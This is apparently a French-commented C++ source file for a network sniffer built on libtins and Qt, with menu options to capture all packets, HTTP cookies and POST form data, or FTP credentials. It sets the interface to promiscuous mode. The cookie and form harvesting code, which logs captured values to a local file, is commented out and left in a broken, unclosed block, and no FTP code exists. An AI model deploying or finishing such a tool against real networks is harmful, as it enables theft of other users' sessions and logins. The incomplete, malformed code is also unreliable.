#include <QCoreApplication>
#include <iostream>
#include <QDebug>
#include <tins/tins.h>
#include <tins/crypto.h>
#include <boost/include/boost/regex/v4/regex.hpp>
#include <boost/include/boost/regex/v4/basic_regex.hpp>

#include <sstream>
#include <QFile>
#include <QDateTime>

std::string network_interface;
int application_mode;

QString save_file_path = "./save_file.txt";
bool save_mode = true;

bool callback(const Tins::PDU &pdu){

    const Tins::IP &ip = pdu.rfind_pdu<Tins::IP>();
    //const Tins::TCP &tcp = pdu.rfind_pdu<Tins::TCP>();

    if(application_mode == 1){

        std::cout << "** Paquet **" << std::endl;
        std::cout << "-------" << std::endl;
        std::cout << "Ip source : " << ip.src_addr() << std::endl;
        std::cout << "Ip destination : " << ip.dst_addr() << std::endl;

        const Tins::RawPDU *raw = pdu.find_pdu<Tins::RawPDU>();
        if(!raw){
            std::cout << "No RawPDU..." << std::endl;
        }else{

            const Tins::RawPDU::payload_type & payload = raw->payload();

            /*if(payload.size() == 0){
                std::cout << "No payload..." << std::endl;
            }
            else{
                std::cout << "\nPayload:" << std::endl;
                std::cout << payload.data() << std::endl;
            }
        }

        std::cout << "-------" << std::endl;
    }
    else if(application_mode == 2){

        //std::cout << "Paquet" << std::endl;

        const Tins::RawPDU *raw = pdu.find_pdu<Tins::RawPDU>();
        if(!raw){
            //std::cout << "No RawPDU..." << std::endl;
            return true;
        }else{

            const Tins::RawPDU::payload_type & payload = raw->payload();

            if(payload.size() == 0){
                //std::cout << "No payload..." << std::endl;
                return true;
            }

            //On s'occupe ici des informations reçus
            //On recupere les cookies si il y en a
            boost::basic_regex regex_cookie("Cookie:( (\\w|;|=)*)*");
            boost::match_results<Tins::RawPDU::payload_type::const_iterator> match_results;
            bool ismatched = boost::regex_search(payload.begin(), payload.end(), match_results, regex_cookie);

            if(ismatched == true){
                std::string cookies = std::string(match_results[0].begin(), match_results[0].end());
                std::cout << cookies << std::endl;

                if(save_mode){

                    QDateTime date_time = QDateTime::currentDateTime();

                    QFile save_file(save_file_path);
                    if(save_file.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Append)){

                        QTextStream out(&save_file);

                        QString final_entry = ("["+date_time.date().toString("dd/MM/yyyy")+" "
                                               +date_time.time().toString("hh:mm:ss")+"] "+QString::fromStdString(cookies)+"\n");
                        out << final_entry;
                    }
                    else{
                        std::cout << "Erreur lors de l'ouverture du fichier " << save_file_path.toStdString() << " : " << save_file.errorString().toStdString() <<std::endl;
                    }

                    save_file.close();
                }
            }

            //On recupere le formulaire Http si POST
            boost::regex regex_method("POST");
            ismatched = boost::regex_search(payload.begin(), payload.end(), match_results, regex_method);

            if(ismatched == true){
                boost::regex regex_form("\\r\\n\\r\\n(\\w|=|&)*");
                ismatched = boost::regex_search(payload.begin(), payload.end(), match_results, regex_form);

                if(ismatched == true){
                    std::string form_not_formatted = std::string(match_results[0].begin(), match_results[0].end());
                    std::string form_formatted = QString::fromStdString(form_not_formatted).mid(8, form_not_formatted.length()-8).toStdString();
                    if(form_formatted != ""){
                        std::cout << "Formulaire: " << form_formatted << std::endl;

                        if(save_mode){

                            QDateTime date_time = QDateTime::currentDateTime();

                            QFile save_file(save_file_path);
                            if(save_file.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Append)){

                                QTextStream out(&save_file);

                                QString final_entry = ("["+date_time.date().toString("dd/MM/yyyy")+" "
                                                       +date_time.time().toString("hh:mm:ss")+"] "+QString::fromStdString(form_formatted)+"\n");
                                out << final_entry;
                            }
                            else{
                                std::cout << "Erreur lors de l'ouverture du fichier " << save_file_path.toStdString() << " : " << save_file.errorString().toStdString() <<std::endl;
                            }
                            save_file.close();
                        }
                    }
                }
            }*/
        }
    }

    return true;
}
int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    std::cout << "Tapez l'interface réseau à sniffer :" << std::endl;
    std::cin >> network_interface;

    std::cout << "Que souhaitez vous faire ?" << std::endl;
    std::cout << "1) Sniffer tout les paquets" << std::endl;
    std::cout << "2) Sniffer les formulaires et cookies Http" << std::endl;
    std::cout << "3) Sniffer les identifiants Ftp" << std::endl;

    std::cin >> application_mode;

    Tins::SnifferConfiguration sniffer_config;
    sniffer_config.set_promisc_mode(true);


    std::cout << "Ecoute de " << network_interface << "..." << std::endl;
    Tins::Sniffer(network_interface , sniffer_config).sniff_loop(callback);

    return a.exec();
}

